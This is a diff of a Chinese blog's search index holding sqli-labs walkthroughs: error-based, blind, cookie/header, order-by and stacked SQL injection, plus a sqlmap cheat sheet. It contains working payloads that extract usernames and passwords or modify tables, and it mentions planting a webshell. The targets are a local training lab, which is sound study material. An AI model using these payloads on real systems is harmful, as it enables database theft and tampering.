+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less 20"></a>less 20</h2><p>只要你登录正确的账户密码</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125140848630.png"></p>
+<p>密码不对的话</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125140944047.png"></p>
+<h3 id="关于cookie"><a href="#关于cookie" class="headerlink" title="关于cookie"></a>关于cookie</h3><p>cookie反正不是能吃的小饼干，</p>
+<p>Cookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由 Web 服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。</p>
+<p>目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>
+<p>持续的 Cookie 则保存在用户的 Cookie 文件中，下一次用户返回时，仍然可以对它进行调用。在 Cookie 文件中保存 Cookie，有些用户担心 Cookie 中的用户信息被一些别有用心的人窃取，而造成一定的损害。其实，网站以外的用户无法跨过网站来获得 Cookie 信息。如果因为这种担心而屏蔽 Cookie，肯定会因此拒绝访问许多站点页面。因为，当今有许多 Web 站点开发人员使用 Cookie 技术，例如 Session 对象的使用就离不开 Cookie 的支持。</p>
+<p>所以用户的cookie被盗用的话，天知道会发生什么（此处应该有滑稽）</p>
+<p>less 20就是在cookie中注入，也是单引号</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125170014475.png"></p>
+<h2 id="less21、less22"><a href="#less21、less22" class="headerlink" title="less21、less22"></a>less21、less22</h2><p>这边对cookie进行了base64编码，less21为单引号，less22为双引号</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125173056231.png"></p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125173324108.png"></p>
+<p>其余皆与前面相同，就不再说了。</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1470,281 +1552,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqllib 18-22</title>
-    <url>/2021/01/24/sqllib-18-22/</url>
-    <content><![CDATA[<h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><img src="/2021/01/24/sqllib-18-22/image-20210124212923133.png"></p>
-<p>post界面，还显示ip地址？莫非……注入点在ip上？</p>
-<p>看看源码</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210124213220267.png"></p>
-<p>好家伙，username和password都被处理了，有点意思</p>
-<p>然后</p>
-<p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script  locations)等等信息的数组。这个数组中的项目由 Web  服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p>
-<p>注意: PHP 5.4.0 之前，$HTTP_SERVER_VARS 包含着相同的信息，但它不是一个超全局变量。 (注意 $HTTP_SERVER_VARS 与 $_SERVER 是不同的变量，PHP处理它们的方式不同)</p>
-<p><strong>$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。<br> $_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。</strong></p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210124213330680.png"></p>
-<p>insert？ip_address? uagent?看起来应该有机会进行注入</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210124231915960.png"></p>
-<p>成功登陆如图所示</p>
-<p>那抓个包看看，</p>
-<p>？？？？？？？抓不出来，啊这，怎么会这样</p>
-<p>百度查了一下需要将127.0.0.1改成本机ipv4的dns，brupsuit不支持抓本地包</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125095923408.png"></p>
-<p>在proxy 中抓到的包发到repeater中，对user-agent进行‘注入，响应中出现报错</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125101641720.png"></p>
-<p>回显的话，就用报错注入吧</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125101946009.png"></p>
-<p>之后就是和前面一样的啦</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125110941683.png"></p>
-<p>然后网上有这种解法但是在我这里不仅不会出数据还不会报错，只能显示ip地址</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125111103481.png"></p>
-<h2 id="less-19"><a href="#less-19" class="headerlink" title="less 19"></a>less 19</h2><p><img src="/2021/01/24/sqllib-18-22/image-20210125140140766.png"></p>
-<p>referer 写面上了，那根据上一关，注入点应该在这里了</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125111654045.png"></p>
-<p>这边的submit的name可以不修改（改了也能用），这里没有用hackbar，不会报错</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125111847639.png"></p>
-<p>来个’试一试，报错了，那剩下的应该和less 18一样，</p>
-<p>打了n个报错语句之后，都不报错，再用‘试一下</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125113423830.png"></p>
-<p>绝了，算了，重新抓包吧，这就离谱</p>
-<p>好了可以了</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125113858188.png"></p>
-<p>尝试一些之前没打过的语句</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125115352434.png"></p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125115547501.png"></p>
-<p>这边因为没有限制的缘故，所以只显示了部分数据</p>
-<p>那真的就没机会一次性爆出所有数据？？？</p>
-<h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><p>然后你可能会发现都没有再用#了，</p>
-<p>#是sql语句中的注释符，+ 在http请求中表示空格，但get与post中，由于http请求的转义，请求到后端sql语句拼接的时候可能会不一样。</p>
-<p><strong>get请求的时候一般用:</strong></p>
-<p>1′ and 1=1 –+</p>
-<p>//这里最后的空格用+，在请求的时候不会被urlencode，到后端sql语句中就会成为一个正常的空格，– 后面的语句就会被注释。</p>
-<p>但是如果在post里最后用加号的话就会被urlencode成%2B，实际的空格被转义才被转义成+</p>
-<p><strong>post请求的时候一般用：</strong></p>
-<p>这时候，在post的情况下，最后一个空格，可以直接用空格，不用+来代替，因为post参数 空格会自动转成+；</p>
-<p>而之所以不在get注入的时候使用“#”来注释，是因为，请求时，“#”不会被urlencode为“%23”，被识别为锚链接，无法传递至sql语句中。</p>
-<p>‘ and select count(*),concat(0x3a,0x3a,(select group_concat(username,password) from users where username not in (‘Dumb),0x3a，0x3a,floor(rand(0)*2))x from users group by x and ‘1’=’1</p>
-<h2 id="less-20"><a href="#less-20" class="headerlink" title="less 20"></a>less 20</h2><p>只要你登录正确的账户密码</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125140848630.png"></p>
-<p>密码不对的话</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125140944047.png"></p>
-<h3 id="关于cookie"><a href="#关于cookie" class="headerlink" title="关于cookie"></a>关于cookie</h3><p>cookie反正不是能吃的小饼干，</p>
-<p>Cookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由 Web 服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。</p>
-<p>目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>
-<p>持续的 Cookie 则保存在用户的 Cookie 文件中，下一次用户返回时，仍然可以对它进行调用。在 Cookie 文件中保存 Cookie，有些用户担心 Cookie 中的用户信息被一些别有用心的人窃取，而造成一定的损害。其实，网站以外的用户无法跨过网站来获得 Cookie 信息。如果因为这种担心而屏蔽 Cookie，肯定会因此拒绝访问许多站点页面。因为，当今有许多 Web 站点开发人员使用 Cookie 技术，例如 Session 对象的使用就离不开 Cookie 的支持。</p>
-<p>所以用户的cookie被盗用的话，天知道会发生什么（此处应该有滑稽）</p>
-<p>less 20就是在cookie中注入，也是单引号</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125170014475.png"></p>
-<h2 id="less21、less22"><a href="#less21、less22" class="headerlink" title="less21、less22"></a>less21、less22</h2><p>这边对cookie进行了base64编码，less21为单引号，less22为双引号</p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125173056231.png"></p>
-<p><img src="/2021/01/24/sqllib-18-22/image-20210125173324108.png"></p>
-<p>其余皆与前面相同，就不再说了。</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqllib 38-45</title>
-    <url>/2021/01/27/sqllib-38-45/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>先看了一遍注入天书，总的来说，这几关都在干一件事情，表面查询数据实则插入数据</del></p>
-<p>对，正经点，叫堆叠注入。顾名思义，堆叠，其实就是堆语句既然sql中一个；结束一个语句，那在把后面的语句直接写上（此处应该有滑稽），</p>
-<p>那我为什么不可以考虑一下增删查改都试一下</p>
-<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><p>先试试增</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128113032861.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128114635400.png"></p>
-<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>数字型注入，那现在不如尝试一下删</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128115454153.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128115512554.png"></p>
-<p>可以比较一下，上面的表和下面的表，你会发现增加的数据已经删除了</p>
-<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>这关是’)，不如试试改表中数据</p>
-<p>尝试报错，无回显</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128120212274.png"></p>
-<p>查询源代码</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128120324857.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128120355344.png"></p>
-<p>不认识的函数又增加了呢</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128140823009.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128140844147.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128140900281.png"></p>
-<p>那这边尝试一下添加表</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128134124098.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128135114420.png"></p>
-<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>数字型注入，类似less39</p>
-<p>less41同less40错误不回显</p>
-<p>那就试一下把刚才的表删了</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128141501475.png"></p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128141521950.png"></p>
-<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p><img src="/2021/01/27/sqllib-38-45/image-20210128142153575.png"></p>
-<p>你看这个界面眼不眼熟，让我想想，对，less24，二次注入？看看源代码来比较一下</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128143227759.png"></p>
-<p>好的刚才猜的不对，less42可以对密码直接攻击</p>
-<p>那？来改个表数据试试？</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128144421945.png"></p>
-<p>来看看结果</p>
-<p><img src="/2021/01/27/sqllib-38-45/image-20210128144445255.png"></p>
-<p>成功了</p>
-<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>从less42的   ’   换成了     ‘）其余思路同上，不再赘述</p>
-<h1 id="less44、45"><a href="#less44、45" class="headerlink" title="less44、45"></a>less44、45</h1><p>盲注的话，拿抓包试了一下，正确无回显，错误显示slap1.jpg</p>
-<p>还是交给sqlmap跑吧，改天sqlmap应该会写个详细的</p>
-<p>至于增删改嘛，同上</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqllib 7-10</title>
-    <url>/2021/01/15/sqllib-7-10/</url>
-    <content><![CDATA[<p>其实less5、less6打了差不多的话这边其实过起来蛮快的，时间隔太长了，再打一次当复习了。</p>
-<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p>7的位置其实我觉得略微尴尬，和前后关卡关系不大</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121145750495.png"><span class="image-caption">image-20210121145750495</span></p>
-<p>通过order by来确定字段数</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121150316810.png"><span class="image-caption">image-20210121150316810</span></p>
-<p>绝对路径不对什么也没有获得到，之前改过的配置文件现在不见了，简直离奇</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121155144911.png"><span class="image-caption">image-20210121155144911</span></p>
-<p>mysql命令行查询，果然有问题，还得再手动设置一次</p>
-<p>在my.ini中添加<img src="/2021/01/15/sqllib-7-10/image-20210121155527594.png"><span class="image-caption">image-20210121155527594</span></p>
-<p>查的时候是说直接=就行，但是在我这里不太行，就加了个“/”,<img src="/2021/01/15/sqllib-7-10/image-20210121155652236.png"><span class="image-caption">image-20210121155652236</span></p>
-<p>导出成功</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121155745775.png"><span class="image-caption">image-20210121155745775</span></p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>同前面几关，<img src="/2021/01/15/sqllib-7-10/image-20210121160549183.png"><span class="image-caption">image-20210121160549183</span></p>
-<p>输入查询数据，在导出的文件中获取信息</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121161015528.png"><span class="image-caption">image-20210121161015528</span></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121161424249.png"><span class="image-caption">image-20210121161424249</span></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121161441899.png"><span class="image-caption">image-20210121161441899</span></p>
-<p>因为查询语句中没有限制是哪个数据库，所以显示出来的结果就不太一样</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121162627151.png"><span class="image-caption">image-20210121162627151</span></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210121162618357.png"><span class="image-caption">image-20210121162618357</span></p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用蚁剑控制木马实现爆破</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210122125351241.png"><span class="image-caption">image-20210122125351241</span></p>
-<p>先扔个木马进去</p>
-<p>用蚁剑连接</p>
-<p>密码即为mmye</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210122130151941.png"><span class="image-caption">image-20210122130151941</span></p>
-<p>至于剩下的嘛，给你一个眼神自己体会</p>
-<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这边不允许了报错注入，可以尝试一下布尔盲注和延时盲注</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210115203729692.png"></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210115204614669.png"></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210115204722930.png"></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210122133953208.png"><span class="image-caption">image-20210122133953208</span></p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210122134114338.png"><span class="image-caption">image-20210122134114338</span></p>
-<p>那就慢慢的猜下去</p>
-<p><img src="/2021/01/15/sqllib-7-10/image-20210122134152534.png"><span class="image-caption">image-20210122134152534</span></p>
-<p>以此继续推出column，然后在推出username和password</p>
-<h2 id="less9、10"><a href="#less9、10" class="headerlink" title="less9、10"></a>less9、10</h2><h3 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h3><p>标题说了时间盲注单引号</p>
-<p>那么就</p>
-<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;">http://127.0.0.1/sqllib/Less-9/?id=1&#39;</a> and if(substr(database(),8,1)=’security’,1,sleep(5)) –+</p>
-<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+</p>
-<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+</p>
-<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+</p>
-<h3 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h3><p>也就是在less9 基础上将单引号改成双引号</p>
-<p>这两关在正确时直接回显，错误时进行延时加载</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqllib 54-65 以及总结</title>
-    <url>/2021/01/29/sqllib-54-65/</url>
-    <content><![CDATA[<h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>收拾一下，可以准备完结撒花了✿✿ヽ(°▽°)ノ✿</p>
-<h1 id="less54-57"><a href="#less54-57" class="headerlink" title="less54-57"></a>less54-57</h1><p>联合注入</p>
-<p>54：’  55： )    56：‘）  57：” </p>
-<h1 id="less58-61"><a href="#less58-61" class="headerlink" title="less58-61"></a>less58-61</h1><p>报错注入</p>
-<p>58： ’        59:              60:      “）          61：     ‘))</p>
-<h1 id="less62-65"><a href="#less62-65" class="headerlink" title="less62-65"></a>less62-65</h1><p>盲注，延时或布尔</p>
-<p>62:    ‘)             63:         ‘             64:     ))                      65:         ) </p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="/2021/01/29/sqllib-54-65/image-20210130205942799.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210009236.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210024742.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210053206.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210104225.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210116012.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210128382.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210146043.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210203156.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210214906.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210226748.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210237022.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210250709.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210301656.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210314538.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210340612.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210350642.png"></p>
-<p><img src="/2021/01/29/sqllib-54-65/image-20210130210413929.png"></p>
-<p>完结，撒花✿✿ヽ(°▽°)ノ✿</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap的使用常见语句</title>
-    <url>/2021/01/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/</url>
-    <content><![CDATA[<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –dbs  // 列举数据库 </p>
-<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –current-db  // 当前数据库</p>
-<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –users   // 列数据库用户</p>
-<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</p>
-<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”  // 列举数据库的表名</p>
-<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”  // 获取表的列名</p>
-<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”  // 获取表中的数据，包含列 </p>
-]]></content>
-      <tags>
-        <tag>sql工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqllib 46-53</title>
-    <url>/2021/01/28/sqllib-46-53/</url>
-    <content><![CDATA[<h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p><del>太感人了，终于打到这了</del>，这边是order by 后的注入以及 limit 注入</p>
-<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p><img src="/2021/01/28/sqllib-46-53/image-20210129212635235.png"></p>
-<p>题目给了提示</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129212618186.png"></p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129212810068.png"></p>
-<p>此处可以直接构造 ?sort= 后面的一个参数。此时，我们可以有三种形式， </p>
-<p>①直接添加注入语句，?sort=(select <strong>**</strong>) </p>
-<p>②利用一些函数。例如 rand()函数等。?sort=rand(sql 语句) </p>
-<p>Ps：此处我们可以展示一下 rand(ture)和 rand(false)的结果是不一样的。【　SQL 有一个 <strong>RAND</strong> 函数，用于产生 0 至 1 之间的随机数：】</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129213016978.png"></p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129213043736.png"></p>
-<p>③利用 and，例如?sort=1 and (加 sql 语句)。 </p>
-<p>同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。 </p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129222855448.png"></p>
-<p>布尔注入的来一个</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129225428694.png"></p>
-<p>延时的话我就不截图了，留个payload好了</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqllib/Less-<span class="hljs-number">46</span>/?sort=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>if(left(database(),<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>E%<span class="hljs-number">27</span>s%<span class="hljs-number">27</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))--+<br></code></pre></td></tr></table></figure>
-
-<p>正确直接回显，错误。。。。诶这个报错有意思</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129225828902.png"></p>
-<p>执行时间最大值30s还行这个错误不大影响注入</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129230639794.png"></p>
-<p>试一下procedure analyse 参数后注入，里面嵌入报错注入语句</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129230848591.png"></p>
-<p>丢个文件试试？</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129231458180.png"></p>
-<p>！！！！！貌似没有权限的样子，查一个权限</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129231832953.png"></p>
-<p>我有权限啊.jpg</p>
-<p>英语不好是我的问题，是我的问题，这个errcode：22貌似是个bug？？？</p>
-<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>从数字型注入换成‘</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129234118261.png"></p>
-<p>要不再丢一次试试？</p>
-<p><img src="/2021/01/28/sqllib-46-53/image-20210129233204538.png"></p>
-<p>这波直接写面上了，去文件夹里还真没找到这个文件</p>
-<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p><img src="/2021/01/28/sqllib-46-53/image-20210129233459094.png"></p>
-<p>这关不会回显报错信息，看起来也是不成功了，其余同less46</p>
-<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>无报错回显，其余同less47</p>
-<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>order by stacked injection！我觉得这关的性质像less38——less45，先用；闭合前面sort查询语句，之后在写修改数据库的语句</p>
-<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>从less50到less51也就多了个‘的区别</p>
-<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>注入方式同less50；无报错回显</p>
-<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>注入方式同less51；无报错回显</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqllib 32-37</title>
     <url>/2021/01/27/sqllib-32-37/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>宽字节注入</p>
@@ -1807,6 +1614,242 @@
 <p>但是同样的方法还是可以用的</p>
 <h1 id="less37"><a href="#less37" class="headerlink" title="less37"></a>less37</h1><p>和less34的情况下，我这边只有在抓包的情况下才能实现注入，这边的过滤函数同less36</p>
 <p><img src="/2021/01/27/sqllib-32-37/image-20210127210402092.png"><span class="image-caption">image-20210127210402092</span></p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 38-45</title>
+    <url>/2021/01/27/sqllib-38-45/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>先看了一遍注入天书，总的来说，这几关都在干一件事情，表面查询数据实则插入数据</del></p>
+<p>对，正经点，叫堆叠注入。顾名思义，堆叠，其实就是堆语句既然sql中一个；结束一个语句，那在把后面的语句直接写上（此处应该有滑稽），</p>
+<p>那我为什么不可以考虑一下增删查改都试一下</p>
+<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><p>先试试增</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128113032861.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128114635400.png"></p>
+<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>数字型注入，那现在不如尝试一下删</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128115454153.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128115512554.png"></p>
+<p>可以比较一下，上面的表和下面的表，你会发现增加的数据已经删除了</p>
+<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>这关是’)，不如试试改表中数据</p>
+<p>尝试报错，无回显</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128120212274.png"></p>
+<p>查询源代码</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128120324857.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128120355344.png"></p>
+<p>不认识的函数又增加了呢</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128140823009.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128140844147.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128140900281.png"></p>
+<p>那这边尝试一下添加表</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128134124098.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128135114420.png"></p>
+<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>数字型注入，类似less39</p>
+<p>less41同less40错误不回显</p>
+<p>那就试一下把刚才的表删了</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128141501475.png"></p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128141521950.png"></p>
+<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p><img src="/2021/01/27/sqllib-38-45/image-20210128142153575.png"></p>
+<p>你看这个界面眼不眼熟，让我想想，对，less24，二次注入？看看源代码来比较一下</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128143227759.png"></p>
+<p>好的刚才猜的不对，less42可以对密码直接攻击</p>
+<p>那？来改个表数据试试？</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128144421945.png"></p>
+<p>来看看结果</p>
+<p><img src="/2021/01/27/sqllib-38-45/image-20210128144445255.png"></p>
+<p>成功了</p>
+<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>从less42的   ’   换成了     ‘）其余思路同上，不再赘述</p>
+<h1 id="less44、45"><a href="#less44、45" class="headerlink" title="less44、45"></a>less44、45</h1><p>盲注的话，拿抓包试了一下，正确无回显，错误显示slap1.jpg</p>
+<p>还是交给sqlmap跑吧，改天sqlmap应该会写个详细的</p>
+<p>至于增删改嘛，同上</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 46-53</title>
+    <url>/2021/01/28/sqllib-46-53/</url>
+    <content><![CDATA[<h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p><del>太感人了，终于打到这了</del>，这边是order by 后的注入以及 limit 注入</p>
+<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p><img src="/2021/01/28/sqllib-46-53/image-20210129212635235.png"></p>
+<p>题目给了提示</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129212618186.png"></p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129212810068.png"></p>
+<p>此处可以直接构造 ?sort= 后面的一个参数。此时，我们可以有三种形式， </p>
+<p>①直接添加注入语句，?sort=(select <strong>**</strong>) </p>
+<p>②利用一些函数。例如 rand()函数等。?sort=rand(sql 语句) </p>
